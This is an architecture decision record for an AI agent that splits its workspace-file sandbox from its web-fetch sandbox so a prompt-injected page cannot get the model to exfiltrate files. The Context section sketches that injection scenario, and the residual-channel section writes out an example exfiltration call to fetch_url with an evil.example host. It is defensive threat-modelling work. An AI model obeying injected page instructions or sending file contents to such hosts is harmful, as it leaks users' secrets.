# ADR-004 — Two sandboxes: `file-sandbox` (workspace, no network) and `web-sandbox` (network, no files)

**Status:** Accepted 2026-09-17 (D-12)
**Supersedes:** doc 03 single `lucca-sandbox` container running SafeFileTool + Playwright together.

## Context

A single container holding both the mounted workspace and internet egress creates a direct exfiltration channel: a prompt-injected page instructs the model to read `/workspace/secret.txt` and POST it to an attacker's HTTPS endpoint — allowed by ADR-003's 80/443 rule. Playwright/Chromium additionally conflicts with `--read-only`, `--cap-drop=ALL`, `noexec /tmp`, and `--pids-limit 64`, and costs 0.8–1.5 GB RAM inside a 4.5 GB WSL2 clamp.

## Decision

| | `lucca-file-sandbox` | `lucca-web-sandbox` |
|---|---|---|
| Lifetime | Long-lived per task; recreated on task close | **Ephemeral per call** (`docker run --rm`), 30 s hard timeout |
| Network | `--network none` | `lucca-net` (ADR-003 egress rules) |
| Mounts | `C:\ProjectLucca\workspace` → `/workspace` (rw) | none (`--read-only`, tmpfs `/tmp` 32 MB) |
| Tools | `read_file`, `write_file`, `list_dir`, `search_text`, `run_python` (restricted) | `fetch_url` (GET only, `httpx` + `trafilatura` readability, ≤ 2 MB body, ≤ 8 redirects, no cookies persisted) |
| Image | `python:3.12-slim` + tool server | `python:3.12-slim` + httpx/trafilatura |
| RAM / CPU / pids | 768 MB / 1.5 / 256 | 512 MB / 1.0 / 128 |
| Security flags (both) | `--read-only --cap-drop=ALL --security-opt=no-new-privileges --user 1000:1000 --tmpfs /tmp:rw,noexec,nosuid,size=32m` (file-sandbox `/workspace` is the only rw path) | same |
| GPU | none | none |
| Chromium | never | **on demand only**: separate image `lucca-web-sandbox-js`, spawned for `fetch_url(render=true)`, `--pids-limit 1024`, `--shm-size 256m`, `--no-sandbox` Chromium flag (documented limitation), still `--network lucca-net`, still no mounts, 45 s timeout |

Data flow between them is **only via `lucca-core`**: `fetch_url` result (text) returns to core → provenance tag `TOOL_CONTENT_UNTRUSTED` → the LLM may *summarise* it; writing fetched content into `/workspace` requires a **separate** `write_file` call that core executes only after the user confirms (risk policy, spec 05/12). Automatic fetch→write chains within one LLM turn are refused by core.

## Residual channel — the LLM itself

Splitting containers removes *in-sandbox* exfiltration (a compromised process cannot both read files and reach the network). It does **not** remove the channel where file content enters the LLM context via `read_file` and the LLM then calls `fetch_url("https://evil.example/?d=<encoded content>")`. Controls for that channel live in the risk policy (spec 12 §3), not in the containers: the pair `(read_file → fetch_url)` is a forbidden sequence within one turn; `fetch_url` URLs are capped at 512 chars with query strings ≤ 128 chars (spec 09 §5); a domain allow-list is the Phase 7 upgrade. This residual is recorded as TM-03 in the threat model.

## Consequences

- In-sandbox exfiltration is structurally impossible; LLM-carried exfiltration is rate- and size-limited and blocked within a turn.
- Chromium costs are paid only when needed; the default WSL2 footprint drops to ≈ 2 GB.
- Slightly more orchestration code (two container specs, two clients) — both implement `SandboxPort`.
- `run_python` inside the file-sandbox has no network by construction, which also kills `pip install` at runtime — dependencies are baked into the image.

## Alternatives

| Option | Why not |
|---|---|
| One container, egress proxy allow-list | Still couples files and network; injection can still exfiltrate to any allow-listed host. |
| No web tool at all | Brief requires read-only web fetch. |
| Host-side fetch (no container) | Puts untrusted parsing (HTML) on the host process; rejected. |
